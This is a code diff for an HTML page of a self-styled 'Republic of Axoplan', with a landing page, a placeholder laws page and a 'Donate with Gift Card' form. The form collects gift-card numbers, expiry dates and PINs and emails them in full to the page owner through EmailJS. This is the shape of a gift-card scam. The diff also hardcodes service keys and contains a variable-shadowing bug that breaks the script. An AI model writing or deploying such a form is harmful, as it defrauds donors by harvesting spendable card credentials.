@@ -1,13 +1,106 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Axoplan Website</title>
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.21.0/dist/umd/supabase.min.js"></script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Republic of Axoplan</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      margin: 0;
+      padding: 20px;
+      background-color: #f4f4f4;
+      color: #222;
+    }
+    input, button, textarea, select {
+      padding: 10px;
+      margin: 5px 0;
+      display: block;
+      width: 100%;
+      max-width: 400px;
+    }
+    .dashboard {
+      border: 1px solid #ccc;
+      background: white;
+      padding: 20px;
+      margin: 20px 0;
+      border-radius: 8px;
+    }
+  </style>
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.21.0/dist/umd/supabase.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 </head>
 <body>
-    <h1>Welcome to the Republic of Axoplan</h1>
-    <!-- Your website content goes here -->
+  <div id="app"></div>
+  <script>
+    // === Setup ===
+    const supabase = supabase.createClient(
+      'https://opxxzfvyplqdncadcwoe.supabase.co',
+      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im9weHh6ZnZ5cGxxZG5jYWRjd29lIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDQ1Njg2MzYsImV4cCI6MjA2MDE0NDYzNn0.UzHh9GG6Byu3MVpyqTRTUW6ITalgO3kh6NneTNp29tw'
+    );
+    emailjs.init('H983VbhvPfCkm9mLm');
+    const app = document.getElementById('app');
+
+    function renderLandingPage() {
+      app.innerHTML = `
+        <h1>Welcome to the Republic of Axoplan</h1>
+        <p>Explore our nation, view our laws, and help build the future.</p>
+        <button onclick="renderLogin()">Login</button>
+        <button onclick="renderLaws()">View Laws</button>
+        <button onclick="renderDonate()">Donate with Gift Card</button>
+      `;
+    }
+
+    function renderLaws() {
+      app.innerHTML = `
+        <h2>Public Laws</h2>
+        <p>[Laws will appear here from Supabase or static for now]</p>
+        <button onclick="renderLandingPage()">Back</button>
+      `;
+    }
+
+    function renderDonate() {
+      app.innerHTML = `
+        <h2>Donate a Gift Card</h2>
+        <form onsubmit="sendGiftCard(event)">
+          <input placeholder="Gift Card Brand" required />
+          <input placeholder="Card Number" required />
+          <input placeholder="Expiration Date" required />
+          <input placeholder="PIN" required />
+          <input placeholder="Amount (USD)" required />
+          <input placeholder="Your Name (optional)" />
+          <button type="submit">Send Donation</button>
+        </form>
+        <button onclick="renderLandingPage()">Back</button>
+      `;
+    }
+
+    function sendGiftCard(e) {
+      e.preventDefault();
+      const form = e.target;
+      const data = {
+        brand: form[0].value,
+        number: form[1].value,
+        expiry: form[2].value,
+        pin: form[3].value,
+        amount: form[4].value,
+        name: form[5].value || 'Anonymous',
+      };
+      emailjs.send('service_ides7ef', 'template_zone9qr', {
+        message: `Gift Card Donation:
+        Brand: ${data.brand}
+        Number: ${data.number}
+        Expiry: ${data.expiry}
+        PIN: ${data.pin}
+        Amount: $${data.amount}
+        Donor: ${data.name}`,
+      }).then(() => {
+        alert('Thank you for your donation!');
+        renderLandingPage();
+      }).catch(console.error);
+    }
+
+    renderLandingPage();
+  </script>
 </body>
 </html>
